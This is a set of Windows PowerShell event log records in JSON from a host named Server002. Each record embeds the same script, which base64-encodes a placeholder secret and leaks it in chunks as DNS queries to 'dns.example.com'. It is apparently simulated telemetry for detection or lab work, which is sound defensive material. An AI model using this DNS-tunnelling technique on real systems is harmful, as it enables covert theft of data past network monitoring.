{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-22 14:18:12.3668235"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=30bc833d-2b5f-4f19-88fc-7285ce4d7da6\r\n\tHostApplication=powershell.exe &amp; {$dnsServer = \"dns.example.com\"\r\n$exfiltratedData = \"SecretDataToExfiltrate\"\r\n$chunkSize = 63\r\n\r\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\r\n$encodedData = [Convert]::ToBase64String($encodedData)\r\n$chunks = $encodedData -split \"(.{$chunkSize})\"\r\n\r\nforeach ($chunk in $chunks) {\r\n $dnsQuery = $chunk + \".\" + $dnsServer\r\n Resolve-DnsName -Name $dnsQuery\r\n Start-Sleep -Seconds 5\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-22 14:18:12.3677720"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=30bc833d-2b5f-4f19-88fc-7285ce4d7da6\r\n\tHostApplication=powershell.exe &amp; {$dnsServer = \"dns.example.com\"\r\n$exfiltratedData = \"SecretDataToExfiltrate\"\r\n$chunkSize = 63\r\n\r\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\r\n$encodedData = [Convert]::ToBase64String($encodedData)\r\n$chunks = $encodedData -split \"(.{$chunkSize})\"\r\n\r\nforeach ($chunk in $chunks) {\r\n $dnsQuery = $chunk + \".\" + $dnsServer\r\n Resolve-DnsName -Name $dnsQuery\r\n Start-Sleep -Seconds 5\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-22 14:18:12.3677720"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=30bc833d-2b5f-4f19-88fc-7285ce4d7da6\r\n\tHostApplication=powershell.exe &amp; {$dnsServer = \"dns.example.com\"\r\n$exfiltratedData = \"SecretDataToExfiltrate\"\r\n$chunkSize = 63\r\n\r\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\r\n$encodedData = [Convert]::ToBase64String($encodedData)\r\n$chunks = $encodedData -split \"(.{$chunkSize})\"\r\n\r\nforeach ($chunk in $chunks) {\r\n $dnsQuery = $chunk + \".\" + $dnsServer\r\n Resolve-DnsName -Name $dnsQuery\r\n Start-Sleep -Seconds 5\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-22 14:18:12.3728994"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=30bc833d-2b5f-4f19-88fc-7285ce4d7da6\r\n\tHostApplication=powershell.exe &amp; {$dnsServer = \"dns.example.com\"\r\n$exfiltratedData = \"SecretDataToExfiltrate\"\r\n$chunkSize = 63\r\n\r\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\r\n$encodedData = [Convert]::ToBase64String($encodedData)\r\n$chunks = $encodedData -split \"(.{$chunkSize})\"\r\n\r\nforeach ($chunk in $chunks) {\r\n $dnsQuery = $chunk + \".\" + $dnsServer\r\n Resolve-DnsName -Name $dnsQuery\r\n Start-Sleep -Seconds 5\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-22 14:18:12.3744200"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=30bc833d-2b5f-4f19-88fc-7285ce4d7da6\r\n\tHostApplication=powershell.exe &amp; {$dnsServer = \"dns.example.com\"\r\n$exfiltratedData = \"SecretDataToExfiltrate\"\r\n$chunkSize = 63\r\n\r\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\r\n$encodedData = [Convert]::ToBase64String($encodedData)\r\n$chunks = $encodedData -split \"(.{$chunkSize})\"\r\n\r\nforeach ($chunk in $chunks) {\r\n $dnsQuery = $chunk + \".\" + $dnsServer\r\n Resolve-DnsName -Name $dnsQuery\r\n Start-Sleep -Seconds 5\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-22 14:18:12.3756470"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=30bc833d-2b5f-4f19-88fc-7285ce4d7da6\r\n\tHostApplication=powershell.exe &amp; {$dnsServer = \"dns.example.com\"\r\n$exfiltratedData = \"SecretDataToExfiltrate\"\r\n$chunkSize = 63\r\n\r\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\r\n$encodedData = [Convert]::ToBase64String($encodedData)\r\n$chunks = $encodedData -split \"(.{$chunkSize})\"\r\n\r\nforeach ($chunk in $chunks) {\r\n $dnsQuery = $chunk + \".\" + $dnsServer\r\n Resolve-DnsName -Name $dnsQuery\r\n Start-Sleep -Seconds 5\r\n}}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-22 14:18:12.4693574"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=30bc833d-2b5f-4f19-88fc-7285ce4d7da6\r\n\tHostApplication=powershell.exe &amp; {$dnsServer = \"dns.example.com\"\r\n$exfiltratedData = \"SecretDataToExfiltrate\"\r\n$chunkSize = 63\r\n\r\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\r\n$encodedData = [Convert]::ToBase64String($encodedData)\r\n$chunks = $encodedData -split \"(.{$chunkSize})\"\r\n\r\nforeach ($chunk in $chunks) {\r\n $dnsQuery = $chunk + \".\" + $dnsServer\r\n Resolve-DnsName -Name $dnsQuery\r\n Start-Sleep -Seconds 5\r\n}}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=ef28a26c-e059-44b6-bf9b-aecd9a36e280\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-22 14:18:16.1657388"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=30bc833d-2b5f-4f19-88fc-7285ce4d7da6\r\n\tHostApplication=powershell.exe &amp; {$dnsServer = \"dns.example.com\"\r\n$exfiltratedData = \"SecretDataToExfiltrate\"\r\n$chunkSize = 63\r\n\r\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\r\n$encodedData = [Convert]::ToBase64String($encodedData)\r\n$chunks = $encodedData -split \"(.{$chunkSize})\"\r\n\r\nforeach ($chunk in $chunks) {\r\n $dnsQuery = $chunk + \".\" + $dnsServer\r\n Resolve-DnsName -Name $dnsQuery\r\n Start-Sleep -Seconds 5\r\n}}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=ef28a26c-e059-44b6-bf9b-aecd9a36e280\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
